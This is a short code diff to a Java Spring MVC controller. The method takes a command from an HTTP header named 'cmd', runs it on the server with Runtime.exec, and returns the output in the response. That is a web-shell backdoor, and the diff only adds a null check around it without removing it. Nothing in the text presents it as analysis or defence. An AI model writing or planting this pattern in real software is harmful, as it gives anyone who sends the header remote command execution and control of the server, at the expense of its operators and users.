@@ -19,8 +19,10 @@ public class SpringMVCTestController {
         javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
 
         String cmd = httprequest.getHeader("cmd");
-        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
-        httpresponse.getWriter().println(res);
+		if(cmd != null && !cmd.isEmpty()){
+			String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();
+			httpresponse.getWriter().println(res);
+		}
 
         return new User();
     }
